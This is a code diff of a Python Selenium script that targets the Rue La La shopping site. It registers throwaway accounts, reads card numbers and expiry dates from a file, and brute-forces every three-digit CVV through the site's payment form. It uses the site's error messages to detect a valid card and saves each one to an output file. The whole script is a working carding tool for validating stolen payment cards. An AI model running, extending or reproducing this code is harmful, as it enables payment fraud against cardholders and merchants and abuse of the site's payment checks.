@@ -7,57 +7,40 @@ from bs4 import BeautifulSoup
 import requests
 import string, random
 
-letters = string.ascii_letters
-letters = ''.join(random.choice(letters) for i in range(10))
-num = str(random.randint(1,101))
-usr = letters+num+letters+'@mail.ru'
-pwd= letters+num+letters
-  
 cpath = "chromedriver.exe"
 driver = webdriver.Chrome(cpath)
-
-capabilities = DesiredCapabilities.CHROME.copy()
-capabilities['goog:loggingPrefs'] = {'performance': 'ALL'}
 
 class RuelalaScraper():
     def __init__(self):
         self.base_url = "https://www.ruelala.com/boutique/"
         self.account_url= "https://www.ruelala.com/account/"
 
-    def scrape(self, usr, pwd):
-        driver.get(self.base_url)
-        print ("Opened ruelala") 
-        sleep(3) 
+    def login(self):
+        letters = string.ascii_letters
+        letters = ''.join(random.choice(letters) for i in range(10))
+        num = str(random.randint(1,101))
+        usr = letters+num+letters+'@mail.ru'
+        pwd= letters+num+letters
+
         username_box = driver.find_element_by_id('landing_email') 
         username_box.send_keys(usr) 
         print ("Email Id entered") 
-        sleep(3) 
+        sleep(1) 
         
         registration_continue_box = driver.find_element_by_id('registration_continue') 
         registration_continue_box.click() 
-        sleep(5)
-        # logs = driver.get_log('performance')
-        # print (logs)
-          
+        sleep(2)
+            
         password_box = driver.find_element_by_id('register_password') 
         password_box.send_keys(pwd) 
         print ("Password entered") 
-          
+            
         registration_submit_box = driver.find_element_by_id('registration_submit') 
         registration_submit_box.click() 
         print ("Success registering")
-        sleep(5)
+        sleep(3)
 
-        driver.execute_script("location.href = 'https://www.ruelala.com/account/'")
-        addPay_submit_box = driver.find_element_by_id('add_payment') 
-        addPay_submit_box.click()
-        sleep(5)
-
-        # closeModalBtn = driver.find_element_by_css_selector("#mat-mobile-wrapper > a")
-        # closeModalBtn.click()
-        
-
-        
+    def inputDetail(self):
         cardName = "Van"
         firstName = "Alexey"
         lastName = "Dev"
@@ -91,38 +74,56 @@ class RuelalaScraper():
 
         phoneNum_box = driver.find_element_by_id('phone') 
         phoneNum_box.send_keys(phoneNum) 
+
+    def inputCard(self, cardNum, cardMonth, cardYear):
+        iframeElementNum = driver.find_element_by_name("braintree-hosted-field-number")
+        driver.switch_to.frame(iframeElementNum)
+        cardNum_box = driver.find_element_by_name('credit-card-number') 
+        driver.execute_script("document.querySelectorAll('input[name=credit-card-number]')[0].value = ''")
+        cardNum_box.send_keys(cardNum)
+        driver.switch_to.default_content()
+
+        iframeElementMonth = driver.find_element_by_name("braintree-hosted-field-expirationMonth")
+        driver.switch_to.frame(iframeElementMonth)
+        cardMonth_box = driver.find_element_by_name('expiration-month') 
+        driver.execute_script("document.querySelectorAll('input[name=expiration-month]')[0].value = ''")
+        cardMonth_box.send_keys(cardMonth)
+        driver.switch_to.default_content()
+
+        iframeElementYear = driver.find_element_by_name("braintree-hosted-field-expirationYear")
+        driver.switch_to.frame(iframeElementYear)
+        cardYear_box = driver.find_element_by_name('expiration-year') 
+        driver.execute_script("document.querySelectorAll('input[name=expiration-year]')[0].value = ''")
+        cardYear_box.send_keys(cardYear) 
+        driver.switch_to.default_content()
+
+    def scrape(self):
+        driver.get(self.base_url)
+        print ("Opened ruelala") 
+        sleep(3) 
         
+        self.login()
+        
+        driver.execute_script("location.href = 'https://www.ruelala.com/account/'")
+        addPay_submit_box = driver.find_element_by_id('add_payment') 
+        addPay_submit_box.click()
+        sleep(5)
+
+        self.inputDetail()
+
         inputFile = open("input.txt", "r")
         for cardDetail in inputFile:
             cardDetail1 = cardDetail.split("|")
             cardNum = cardDetail1[0]
             cardMonth = cardDetail1[1]
             cardYear = cardDetail1[2]
-
-            iframeElementNum = driver.find_element_by_name("braintree-hosted-field-number")
-            driver.switch_to.frame(iframeElementNum)
-            cardNum_box = driver.find_element_by_name('credit-card-number') 
-            driver.execute_script("document.querySelectorAll('input[name=credit-card-number]')[0].value = ''")
-            cardNum_box.send_keys(cardNum)
-            driver.switch_to.default_content()
-
-            iframeElementMonth = driver.find_element_by_name("braintree-hosted-field-expirationMonth")
-            driver.switch_to.frame(iframeElementMonth)
-            cardMonth_box = driver.find_element_by_name('expiration-month') 
-            driver.execute_script("document.querySelectorAll('input[name=expiration-month]')[0].value = ''")
-            cardMonth_box.send_keys(cardMonth)
-            driver.switch_to.default_content()
-
-            iframeElementYear = driver.find_element_by_name("braintree-hosted-field-expirationYear")
-            driver.switch_to.frame(iframeElementYear)
-            cardYear_box = driver.find_element_by_name('expiration-year') 
-            driver.execute_script("document.querySelectorAll('input[name=expiration-year]')[0].value = ''")
-            cardYear_box.send_keys(cardYear) 
-            driver.switch_to.default_content()
+            
+            self.inputCard(cardNum, cardMonth, cardYear)
             
             for cvv in range(999):
+                
                 cardCVV = '{0:03d}'.format(cvv)
-                sleep(5)
+                sleep(2)
                 iframeElementCVV = driver.find_element_by_name("braintree-hosted-field-cvv")
                 driver.switch_to.frame(iframeElementCVV)
                 cardCVV_box = driver.find_element_by_name('cvv')
@@ -134,22 +135,32 @@ class RuelalaScraper():
                 submitButton.click()
                 sleep(5)
 
-                # if (len(driver.find_element_by_css_selector("ul.form-errors > li.form-error")) > 0):
-                #     result = driver.find_element_by_css_selector("ul.form-errors > li.form-error").get_attribute('innerHTML')
-                #     print(result)
+                if(driver.find_element_by_css_selector("#credit_card_form > ul.form-errors").get_attribute('innerHTML') == ""):
+                    driver.execute_script("location.reload()")
+                    addPay_submit_box = driver.find_element_by_id('add_payment') 
+                    addPay_submit_box.click()
+                    sleep(3)
+                    self.inputCard(cardNum, cardMonth, cardYear)
+                    self.inputDetail()
+                    cvv = cvv - 1
+                    continue
+                else:
+                    result = driver.find_element_by_css_selector("ul.form-errors > li.form-error").get_attribute('innerHTML')
 
-                #     if (result == "Your billing address did not match the address on file for your credit card.  Please correct your address and try again."):
-                #         print("true")
-                #         break
-                #     if (result == "Sorry, your card was declined. Please contact your bank or try a different card."):
-                #         print("false")
-                #         continue
-                # else:
-                #     continue
+                    if (result == "Your billing address did not match the address on file for your credit card.  Please correct your address and try again."):
+                        print("true")
+                        cardInfo = cardNum + "|" + cardMonth + "|" + cardYear + "|" + cvv
+                        f = open("output.txt", "a+")
+                        f.write(cardInfo + "\n")
+                        break
+                    if (result == "Sorry, your card was declined. Please contact your bank or try a different card."):
+                        print("false")
+                        continue
+                
         
 if __name__ == '__main__':
     scraper = RuelalaScraper()
-    scraper.scrape(usr, pwd)
+    scraper.scrape()
 
 input('Press anything to quit') 
 driver.quit() 
